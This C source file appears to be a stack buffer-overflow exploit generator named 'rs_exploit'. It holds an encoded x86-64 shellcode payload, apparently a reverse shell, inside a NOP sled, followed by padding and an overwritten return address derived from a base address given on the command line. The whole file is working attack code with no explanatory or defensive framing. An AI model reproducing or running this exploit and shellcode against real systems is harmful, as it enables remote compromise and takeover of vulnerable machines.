#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#define buff_size 1024
#define addr_size 8
#define padding_len 50
#define NOP 0x90

unsigned char sh_code[] = 
"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d\x05\xef\xff"
"\xff\xff\x48\xbb\x50\x41\xb1\x96\xbe\x31\xc6\x4e\x48\x31\x58"
"\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x3a\x68\xe9\x0f\xd4\x33"
"\x99\x24\x51\x1f\xbe\x93\xf6\xa6\x8e\xf7\x52\x41\xa0\xca\x12"
"\x21\x03\x4f\x01\x09\x38\x70\xd4\x21\x9c\x24\x7a\x19\xbe\x93"
"\xd4\x32\x98\x06\xaf\x8f\xdb\xb7\xe6\x3e\xc3\x3b\xa6\x2b\x8a"
"\xce\x27\x79\x7d\x61\x32\x28\xdf\xb9\xcd\x59\xc6\x1d\x18\xc8"
"\x56\xc4\xe9\x79\x4f\xa8\x5f\x44\xb1\x96\xbe\x31\xc6\x4e";

char buff[1050];

void main(int argc, char *argv[]) {
	int sh_len = strlen(sh_code);
	char *ptr = buff;
	if(argc < 2) {
		printf("usage ./rs_exploit <base_addr>\n");
		exit(0);
	}
	long base_addr = strtol(argv[1], NULL, 0);
	memset(buff, 0, sizeof(buff));
	
	for(int i = 0; i < buff_size - sh_len - padding_len; ++i) {
		*ptr = NOP;
		ptr++;
	}
	for(int i = 0; i < sh_len; ++i) {
		*ptr = sh_code[i];
		ptr++;
	}
	for(int i=0; i < padding_len; ++i) {
		*ptr = NOP;
		ptr++;
	}
	long *a_ptr = (long *) ptr;
	// saved rsp
	*a_ptr = 0x5555555555555555;
	a_ptr++;
	*a_ptr = base_addr - buff_size / 2;
	printf("%s", buff);
}
